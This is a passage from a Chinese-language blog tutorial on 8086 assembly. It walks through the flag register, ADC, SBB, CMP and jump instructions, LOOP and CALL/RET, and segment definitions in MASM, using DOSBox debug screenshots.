src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310154440.png"><br>之后开始测试数据，具体执行的汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,0001</span><br><span class="line">mov ax,[bx]</span><br><span class="line">mov bp,0001</span><br><span class="line">mov ax,[bp]</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310154637.png"><br>ax现在的内容是<code>5000:0000</code>位置偏移为1的内容，我们再去看bp的内容，继续执行两次查看结果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310154752.png"><br>ax变成了A9CB，这里的内容是从<code>6000:0000</code>中拿出的。要注意的是bp是可以配合其他的寄存器和偏移使用的，但是他不可以配合bx寄存器来用，因为bx是基于DS寄存器的。具体参考下面汇编代码，以及报错输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bp]</span><br><span class="line">mov ax,[bp+1]</span><br><span class="line">mov ax,[bp+si]</span><br><span class="line">mov ax,[bp+di]</span><br><span class="line"># bp和bx不能一起用</span><br><span class="line">mov ax,[bp+bx]</span><br></pre></td></tr></table></figure><p>错误输出如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310155515.png"></p><h2 id="寻址寄存器相关总结"><a href="#寻址寄存器相关总结" class="headerlink" title="寻址寄存器相关总结"></a>寻址寄存器相关总结</h2><p><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310155832.png"></p><h2 id="标志位寄存器"><a href="#标志位寄存器" class="headerlink" title="标志位寄存器"></a>标志位寄存器</h2><p>CPU内部的寄存器中，有一种特殊的寄存器(低于不通的处理机，个数和结构都可能不同)具有以下三种作用。</p><ol><li>用来存储相关指令的某些执行结果。</li><li>用来为CPU执行相关指令提供行为依据。</li><li>用来控制CPU的相关工作方式。<br>这些特殊的寄存器在8086CPU中，被称为标志寄存器。8086CPU的标志寄存器有16位，其中存储的信息通常被称为程序状态字(PSW)。我们已经使用过8086CPU的ax、bx、cx、dx、si、di、bp、sp、ip、cs、ss、ds、es等13个寄存器了，当前章节的标志寄存器(以下简称flag)是我们要学习的最后一个寄存器。<br>flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。<br>8086CPU的flag寄存器的结构图如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310162649.png"><br>flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的含义。<br>在这一章节中，我们学习标志寄存器中的CF、PF、ZF、SF、OF、DF标志位，以及一些与其相关的典型指令。</li></ol><h3 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h3><p>flag的第6位是ZF，0标志位。他记录相关指令执行后，其结果是否为0。如果结果为0，那么zf&#x3D;1；如果结果部位0，那么zf&#x3D;0。<br>参考下面汇编指令，来去验证zf的变动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><p>执行结果在Debug中的体现如下图，先把ax改成1，执行之后NZ那个东西就是ZF标识即<code>NoZero</code>应该是这样理解，这是我自己理解的。然后等sub命令执行之后ax变成了0，ZF标志位变成了ZR，他代表<code>zero</code><br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310165002.png"></p><h3 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h3><p>flag的第二位是PF，奇偶标志位。他记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，pf&#x3D;1，如果奇数，那么pf&#x3D;0。在命令中的具体体现可以参考下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0000</span><br><span class="line">add ax,1</span><br><span class="line">add ax,1</span><br><span class="line">add ax,1</span><br></pre></td></tr></table></figure><p>执行结果如下，pe即代表偶数也就是pf&#x3D;1，po即代表是奇数也就是pf&#x3D;0<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250310170031.png"><br>然后这里有个问题，算奇数偶数为什么ax的值是1和2的时候都是奇数呢？因为他算的是一个bit中的1的数量，ax&#x3D;0001的时候，他的bit8位表示是<code>00000001</code>他就一个1所以标识奇数,ax&#x3D;0002的时候，他的bit8位标识是<code>00000010</code>，还是一个1，所以还是一个奇数。</p><h3 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h3><h4 id="负数如何表示？"><a href="#负数如何表示？" class="headerlink" title="负数如何表示？"></a>负数如何表示？</h4><p>在二进制中，负数的表示方式通常采用 补码，它的计算方法如下：</p><ul><li>正数：与原码相同</li><li>负数：<ol><li>先求该数的 绝对值的二进制（原码）。</li><li>按位取反（0 变 1，1 变 0）。</li><li>加 1（即 +1 操作）。</li></ol></li></ul><p>假设使用 8 位二进制来表示 -5：</p><ul><li>+5 的二进制（原码）: 00000101</li><li>按位取反: 11111010</li><li>加 1: 11111011（即 -5 的补码）</li></ul><p>所以，-5 在 8 位二进制中表示为：11111011</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>flag的第七位是SF，符号标志位。他记录相关指令后，结果是否为负。如果结果为负，SF&#x3D;1；如果非负，SF&#x3D;0。计算机中通常用补码来标识有符号数据。计算机中的一个数据可以看作是有符号数，也可以看成是无符号数。比如：</p><ul><li>00000001B，可以看作为无符号数1，或有符号数+1;</li><li>10000001B，可以看作无符号数129，也可以看作有符号数-127；</li></ul><p>也就是说对于同一个二进制数据，计算机可以将他当作无符号数据来运算，也可以当作有符号数据来运算。比如下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001B(81h)</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure><p>可以将add指令进行的运算当作无符号的运算，那么add指令相当于计算129+1，结果为130(10000010B)；也可以将add指令进行的运算当作有符号数的运算，那么add指令相当于计算-127+1，结果为-126(10000010B)。<br>下面举个例子，执行下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0</span><br><span class="line">add ax,1</span><br><span class="line">sub ax,1</span><br><span class="line">sub ax,1</span><br><span class="line">add ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><p>执行4次后的输出如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313193258.png"><br>在mov的时候是ng即负，这应该是一个默认值，然后变成正数之后变成了PL，然后从0减到-1的时候变成了NG，好，继续运行<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313193535.png"><br>继续运行是+1然后-1 变成0之后在变-1,对应的这里的SF标志也在变。</p><h3 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h3><p>flag的第0位是CF，进位标志位。一般情况下，在进行无符号数运算的时候，他记录了运算结果的最高有效位向更高位的进位值，活从更高位的借位值。对于位数为N的无符号数来说，其对应的二进制信息的最高位。<br>看个例子，执行下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov al,10</span><br><span class="line">mov bl,10</span><br><span class="line">add al,bl</span><br><span class="line">mov al,20</span><br><span class="line">mov bl,21</span><br><span class="line">add al,bl</span><br><span class="line">mov al,98</span><br><span class="line">mov bl,98</span><br><span class="line">add al,bl</span><br></pre></td></tr></table></figure><p>先看前3个执行效果，如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313195107.png"><br>CY代表进位，NC代表没有，也可以理解为进位，是否影响了更高位<br>继续执行3个效果，运行结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313195227.png"><br>这里al-20去加bl-21变成了41，更高位没有变化，所以都是NC，继续执行后三条指令，运行结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313195351.png"><br>这里影响更高位了，98h+98h&#x3D;130h，所以变成了CY。</p><h3 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h3><p>在进行有符号运算的时候，如果结果超过了机器所能表示的范围称为溢出。<br>那么什么是机器所能表示的范围呢？<br>比如说，指令运算的结果用8位寄存器或内存单元来存放，比如，add al,3，那么对于8位的有符号数据，机器所能表示的范围就是-128<del>127。同理，对于16位有符号数据，机器所能表示的范围是-32768</del>32767。<br>注意，这里所说的溢出，只是对有符号数运算而言。参考下面的例子，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov ax,634</span><br><span class="line">mov al,63</span><br><span class="line">mov bl,62</span><br><span class="line">add al,bl</span><br><span class="line">mov al,10</span><br><span class="line">mov bl,20</span><br><span class="line">add al,bl</span><br><span class="line">mov al,ff</span><br><span class="line">mov bl,ff</span><br><span class="line">add al,bl</span><br><span class="line">mov al,aa</span><br><span class="line">mov bl,aa</span><br><span class="line">add al,bl</span><br></pre></td></tr></table></figure><p>先执行4次命令，结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313201854.png"><br>第一竖行是OF标志位，第二竖行是CF标志位，OV就是代表溢出了，那为什么63h+62h就溢出了？他会产生一个正的197，如果是带符号的那就是负的59，而8位能表示的范围是-128~127，不带符号的结果出现了溢出。继续运行3次指令，结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313203043.png"><br>这个是没有进位也没有溢出的结果，我们继续运行三次看一下结果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313203249.png"><br>FF+FF最终是1FE，没有溢出但是影响了最高位，好，我们继续看，再次执行3次指令，结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313203428.png"><br>aa+aa的结果是154，高位进了，而且八位最高127，他这里154也溢出了。(这个位置其实我并没有理解，看了一会感觉应该是没那么重要，后面用到再回来看应该理解会更加深入一些，有清楚的大佬欢迎指正。)</p><h2 id="ADC指令"><a href="#ADC指令" class="headerlink" title="ADC指令"></a>ADC指令</h2><p>ADC是带进位加法指令，它利用了CF位上记录的进位值。具体用法参考下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br></pre></td></tr></table></figure><p>执行过后发现经过adc指令之后ax变成了4，ax(2)+1变成了4，为什么会这样呢？按照当前例子来算，他的加法原理是(ax)&#x3D;(ax)+(1)+CF，他在add基础上加上了一个CF标志位寄存器的内容，这个CF是一个进位的标志位，在第三条命令的时候bx(1)-ax(2)的时候借位了，而CF要么是0要么是1，借位的时候变成了1，他就会多加1，结果就变成4了。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313204425.png"><br>这个指令一般应用到下面场景，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0198</span><br><span class="line">mov bx,0183</span><br><span class="line">add al,bl</span><br><span class="line">adc ah,bh</span><br></pre></td></tr></table></figure><p>最终ax的结果是正确的，在al(98)+bl(83)的时候会产生进位，进位的那个一个数值会直接丢弃，通过adc计算高位就可以拿回刚才进位产生的一个数值。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250313205706.png"></p><h2 id="SBB指令"><a href="#SBB指令" class="headerlink" title="SBB指令"></a>SBB指令</h2><p>sbb是带借位减法指令，它利用了CF位上记录的借位值。举个例子，汇编指令为<code>sbb ax,bx</code>最终的运算结果是(ax) &#x3D; (ax) - (bx) - CF<br>这个指令和adc设计思想都是相同的，具体的例子这里不多讲述。虽然这两个命令并不常用，但是我们通过学习这两条指令，可以领会一下标志位寄存器CF位的作用和意义。</p><h2 id="CMP指令与跳转指令"><a href="#CMP指令与跳转指令" class="headerlink" title="CMP指令与跳转指令"></a>CMP指令与跳转指令</h2><p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。CMP指令执行后，将对标志寄存器产生影响。其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。具体参考如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ZF（零标志，Zero Flag）：如果比较结果为0（即目的操作数等于源操作数），ZF置1。</span><br><span class="line">SF（符号标志，Sign Flag）：结果的最高位（符号位）为1时，SF置1，表示结果为负。</span><br><span class="line">CF（进位标志，Carry Flag）：如果目的操作数小于源操作数（无符号数比较），CF置1。</span><br><span class="line">OF（溢出标志，Overflow Flag）：如果有符号数运算溢出，OF置1。</span><br><span class="line">PF（奇偶标志，Parity Flag）：结果低8位中1的个数为偶数时，PF置1。</span><br><span class="line">AF（辅助进位标志，Auxiliary Carry Flag）：低4位向高4位有进位时，AF置1。</span><br></pre></td></tr></table></figure><p>它通常与跳转指令配合使用，下面是一些常用的跳转指令</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JE    等于则转移         ZF=1</span><br><span class="line">JNE   不等于则转移       ZF=0</span><br><span class="line">JB    低于则转移         CF=1</span><br><span class="line">JNB   不低于则转移       CF=0</span><br><span class="line">JA    高于则转移         CF=0且ZF=0</span><br><span class="line">JNA   不高于则转移       CF=1或CF=1</span><br></pre></td></tr></table></figure><p>这些指令都比较常用，它们都很好记忆，它们的第一个字母都是J，表示JUMP；后面的字母表示含义如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e  表示equal</span><br><span class="line">ne 表示not equal</span><br><span class="line">b  表示below</span><br><span class="line">nb 表示not below</span><br><span class="line">a  表示above</span><br><span class="line">nb 表示not above</span><br></pre></td></tr></table></figure><p>这里就不作实验了，后面会直接使用，具体可以参考下面章节的内容。</p><h1 id="源文件编写代码"><a href="#源文件编写代码" class="headerlink" title="源文件编写代码"></a>源文件编写代码</h1><h2 id="运行ASM源代码文件"><a href="#运行ASM源代码文件" class="headerlink" title="运行ASM源代码文件"></a>运行ASM源代码文件</h2><p>在最初安装学习环境的时候，工具包中提供了很多二进制命令，运行源码文件可以通过MASM去处理成OBJ文件，通过LINKE编译成可执行文件，然后通过debug去运行。具体参考案例如下<br>先创建一个asm文件，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">    mov ax,0123H</span><br><span class="line">    mov bx,0456H</span><br><span class="line">    add ax,bx</span><br><span class="line">    add ax,ax</span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>之后在DOSBox中执行MASM指令去处理，参考下面运行结果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314152530.png"><br>之后通过link去做编译<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314152551.png"><br>此时这个目录下会多出一个CODE.EXE，因为这些代码并没有实际能实现什么效果，直接运行不会出现任何内容，可以采用debug的形式去运行他，参考下面结果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314152739.png"></p><h2 id="LOOP指令"><a href="#LOOP指令" class="headerlink" title="LOOP指令"></a>LOOP指令</h2><p>对于汇编指令，loop指令是无法在debug中写的，因为他是要去写函数的，在debug中无法直接去写，他涉及了一些伪指令，需要去txt中去写。LOOP指令的作用是循环，CPU在执行LOOP指令的时候，要进行两步操作，先是(cx)&#x3D;(cx)-1，然后判断cx中的值，不为零则转至标号处执行程序，如果为0则向下执行。具体参考例子为计算2的12次方，参考代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    mov ax,2</span><br><span class="line">    mov cx,11</span><br><span class="line">s: add ax,ax</span><br><span class="line">loop s</span><br><span class="line">    </span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>执行4次结果如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314163915.png"><br>loop干了一个偏移的事，把IP寄存器改成了0006，我们通过u命令查看一下这个位置的内容，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314164049.png"><br>发现0006就是s函数中的内容。继续执行会发现一直在0006这个偏移中跳转，并且发现CX每到loop的时候都会-1<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314164259.png"><br>一直到cx到0的时候IP到了000A，并且不再继续跳转，2的12次方也拿到了正确的数值<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314164429.png"><br>要注意的是，loop执行之前，cx不要为0，因为它运行会先去给cx-1，然后去判断是否为0再去执行，cx如果是0然后-1，那么他就会变成FFFF，会一直把FFFF循环完，近似于一个死循环了……</p><h2 id="Debug指令G"><a href="#Debug指令G" class="headerlink" title="Debug指令G"></a>Debug指令G</h2><p>上面的loop案例都是通过debug的t指令一步一步执行的，我们也可以使用debug的g指令一次性执行到头，例如我们整个命令是到<code>000A</code>结束，参考下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314164821.png"><br>我们可以直接通过debug的g命令运行到这个位置，使用结果如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314165006.png"><br>直接用G跳转到了<code>000A</code>并且成功运算出了结果。</p><h2 id="Debug指令P"><a href="#Debug指令P" class="headerlink" title="Debug指令P"></a>Debug指令P</h2><p>上面使用了t一步一步执行，也用了g一次性执行到某个位置，然后我再学习一下p指令，他的作用是把当前当前循环执行的命令一次性运行完。参考下面执行结果<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314165421.png"><br>CX到A也就是10的时候我这里直接输入p一次性执行完循环了，直接成功运算出了结果。</p><h2 id="CALL与RET指令"><a href="#CALL与RET指令" class="headerlink" title="CALL与RET指令"></a>CALL与RET指令</h2><p>call和ret都是转移指令，他们都修改IP，或同时修改CS和IP。他们经常被共同用来实现子程序的设计。上面是简单创建了一个函数去使用，函数写进去之后，会被直接根据顺序直接调用，那么我们如何更优雅的去运行他们呢？这里就可以通过CALL和RET指令来去配合使用，具体参考下面代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    mov ax,2</span><br><span class="line">    mov cx,11</span><br><span class="line">    call s</span><br><span class="line">    int 21H</span><br><span class="line">s: add ax,ax</span><br><span class="line">loop s</span><br><span class="line">    ret</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>运行就不具体运行了，要注意的是<code>int 21H</code>这个中断，这个中断的含义是用来结束运行的，如果没有这个则会继续返回到call执行的下一个指令即运行s函数的内容，可能会造成于一个近似死循环的一个行为。。。</p><h3 id="RET和RETF"><a href="#RET和RETF" class="headerlink" title="RET和RETF"></a>RET和RETF</h3><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；<br>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。<br>具体应用的体现在哪呢？如果使用ret，他只能修改IP的内容，也就是偏移的值，但是偏移是有上线的，在8086CPU中，偏移的上线是<code>FFFF</code>，超过这个就回不去了，而retf还可以修改cs寄存器，这样修能实现远偏移。</p><h3 id="call和“call-far-ptr”"><a href="#call和“call-far-ptr”" class="headerlink" title="call和“call far ptr”"></a>call和“call far ptr”</h3><p>call和“call far ptr”的关系和ret与reft的关系基本对应，有一个近远的区别。<br>具体使用就是下面代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    mov ax,3</span><br><span class="line">    mov cx,11</span><br><span class="line">    call far ptr s</span><br><span class="line">    int 21H</span><br><span class="line">s: add ax,ax</span><br><span class="line">loop s</span><br><span class="line">    retf</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我这里就不继续运行了，看一参考底部案例实践的内容。</p><h3 id="CALL指令的本质"><a href="#CALL指令的本质" class="headerlink" title="CALL指令的本质"></a>CALL指令的本质</h3><p>CPU执行CALL指令的时候，会进行两步操作，首先会把当前的IP或CS和IP压入栈中。然后转移到被调函数的位置。CALL指令不能实现短转移，除此之外，CALL指令实现转移的方法和JMP指令的原理相同。</p><h3 id="RET指令的本质"><a href="#RET指令的本质" class="headerlink" title="RET指令的本质"></a>RET指令的本质</h3><p>当CALL指令把指针相关数据压入栈中，最终执行到RET的时候，会进行弹栈的操作，然后修改指针偏移。</p><h3 id="案例实践"><a href="#案例实践" class="headerlink" title="案例实践"></a>案例实践</h3><p>以下面代码为例,我们看一下栈中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    mov ax,2</span><br><span class="line">    mov cx,11</span><br><span class="line">    call s</span><br><span class="line">    int 21H</span><br><span class="line">s: add ax,ax</span><br><span class="line">loop s</span><br><span class="line">    ret</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们先设置一块空的地方为栈顶<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314205856.png"><br>然后把命令执行到call s的下一条指令，看一下栈中的数据<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314210009.png"><br>这里存储了一个0900，这个是高低位转换之后的，实际应该是<code>0009</code>，我们再看一下我们命令的偏移，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314210157.png"><br>0009的偏移位置是直接<code>ini 21</code>刚好对应执行顺序，我们去运行到ret的时候会自动弹栈拿到这个位置，并跳转。一直到ret，CS和IP的内容更变如下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314210314.png"><br>这里是<code>call</code>和<code>ret</code>的对应关系，然后<code>call far ptr</code>和<code>reft</code>是对应的，远位转移在栈中存储的是CS和IP的位置，这个要注意，具体参考下图。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250314204059.png"></p><h2 id="代码中装载数据"><a href="#代码中装载数据" class="headerlink" title="代码中装载数据"></a>代码中装载数据</h2><p>MASM内部以数据位的个数定义了多种数据类型</p><ul><li>BYTE，db，8bit</li><li>WORD，dw，16bit</li><li>DWORD，dd，32bit</li><li>QWORD，dq，64bit</li></ul><p>我们通过debug用这些指令定义数据查看一下会CPU会执行什么内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dw 1234</span><br><span class="line">dw 456,789</span><br><span class="line">dw abcd,ef,123,456,789</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315132312.png"><br>他把这些数据直接丢到了代码段，在汇编中，数据和指令是不会去做区分的，数据可以当作指令去执行，指令也可以当作数据去用。再去参考下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    dw 0123h, 4567h, 89ABh</span><br><span class="line">    mov ax, 0</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>把上面代码丢到debug中运行，再去查看代码段的内容会发现，前面数据都是对的，后面的mov指令变没了，出现这个问题主要是因为上面说的，数据和指令他不会去做区分，拿到什么内容既可以当作数据也可以当作命令，这里的数据堆起来之后变成了另外的命令，所以mov指令就没了<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315134654.png"><br>想要做到分离数据与指令，可以通过下面的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    dw 0123h, 4567h, 89ABh</span><br><span class="line">start: mov ax, 0</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>主要是在数据定义完之后通过<code>start</code>创建一个指令入口，我们放到debug中查看一下与上面的区别<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315135359.png"><br>使用start的代码最终执行的时候IP会自动到指令的位置，而不是从头执行，虽然这里通过debug的u指令看到命令还是乱的，但是IP寄存器指向的位置却是一个正常的。</p><h2 id="将数据、代码、栈放入不同的段"><a href="#将数据、代码、栈放入不同的段" class="headerlink" title="将数据、代码、栈放入不同的段"></a>将数据、代码、栈放入不同的段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line">data segment</span><br><span class="line">    db &#x27;Hello, world!&#x27;</span><br><span class="line">    dw 123h, 456h, 789h, 0ABh,0defh</span><br><span class="line">    db 3 dup (1,2,3)</span><br><span class="line">    db 3 dup (&#x27;abc&#x27;,&#x27;def&#x27;)</span><br><span class="line">data ends</span><br><span class="line">stack segment</span><br><span class="line">    db 10 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">    start: mov ax, 0</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>参考上面汇编代码，其中cs、ds、ss分别用来定义不通的段，这三个具体的含义参考如下</p><ul><li>cs:code: 将代码段寄存器（CS）关联到名为 code 的段，表示程序的指令存放在 code 段。</li><li>ds:data: 将数据段寄存器（DS）关联到名为 data 的段，表示程序的数据存放在 data 段。</li><li>ss:stack: 将堆栈段寄存器（SS）关联到名为 stack 的段，表示程序的堆栈存放在 stack 段。</li></ul><p>然后这里还引入了一个dup指令，他的含义是数据需要多少份来放到对应的位置。例如上面的<code>db 10 dup (0)</code> 意为创建10份为0的数据。再data段的dw指令，后面的数据为什么都带<code>0</code>，原因是因为MASM是不支持16进制以字母开头的，全字母需要使用<code>0</code>来作为前缀<br>然后这里再具体说一下start的含义，他是用来定义代码运行的起始位置的，然后后面的<code>end start</code>是执行完成之后还会回到start的最初位置。我们运行一下代码，查看这些数据是什么形式存储的<br><img 